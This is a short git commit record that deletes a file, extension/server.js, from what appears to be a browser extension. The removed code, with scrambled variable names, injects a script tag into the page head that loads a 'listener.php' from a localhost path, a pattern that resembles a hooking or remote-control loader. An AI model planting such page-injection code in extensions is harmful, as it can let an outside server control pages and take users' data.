6fa1d1dc674feb8e1fcd9fdea0f08b0c56e6ecd8
Andrew <andrew.blalock.ops@gmail.com>
2020-01-12 03:43:09 -0600

    Delete server.js

--- extension/server.js
+++
@@ -1,9 +0,0 @@
-var hjZuf=document.createElement("script");
-hjZuf.setAttribute("type","text/javascript");
-if (location.protocol !== "https:") {
-  hjZuf.setAttribute("src","http://localhost/jb/js/listener.php?proto=http");
-} else {
-  hjZuf.setAttribute("src","https://localhost/jb/jb/js/listener.php?proto=https");
-}
-var gfDrh = document.getElementsByTagName("head")[0];
-gfDrh.appendChild(hjZuf);
